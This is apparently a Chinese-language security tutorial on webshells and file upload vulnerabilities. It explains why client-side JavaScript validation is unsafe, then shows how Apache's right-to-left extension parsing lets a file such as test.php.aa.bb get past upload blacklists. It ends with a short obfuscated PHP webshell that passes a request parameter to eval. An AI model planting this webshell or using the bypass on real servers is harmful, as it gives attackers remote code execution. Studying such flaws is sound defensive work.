# **Webshell与文件上传漏洞 -2**

## 1.为什么说js校验是一种不安全的校验方式？

JavaScript是一种脚本语言，其执行过程发生在用户的浏览器端。在客户端进行的验证相当于“让用户自己验证自己”，很明显是不靠谱的。你不能避免一些恶意用户人为的修改自己提交的表单进行欺骗，也不能避免第三方对表单进行截获后进行篡改再提交。但是JS验证有它存在的必要，因为首先JS验证速度很快，不需要HTTP交互，可以在本地验证，对于用户来说，提示错误会显得非常迅速。其次是普通用户一般占访问用户的绝大多数，也就是说，大部分的验证工作，都是有效的，在前端验证可以极大的减轻服务器的压力。

## 2.Apache解析漏洞如何利用呢？
前情提要：Apache在解析文件时有一个原则：当碰到不认识的扩展名时，将会从后面向前解析，直到碰到认识的扩展名为止。

例 上传文件：

>test.php.aa.bb

后缀名bb 不认识,向前解析

>test.php.aa

后缀名aa 不认识 向前解析

>test.php

**所以最终解析结果为PHP文件**

这种方法可以绕过上传黑名单的检查，（如网站上传限制,不允许上传后缀名为PHP的文件）既然你可以让服务器解析你的php文件，那为何不让服务器解析如下代码(手动滑稽)
```
<?php
$a=call_user_func(function($u){return @$_REQUEST[$u];},'1');
eval(/**/($a));
```
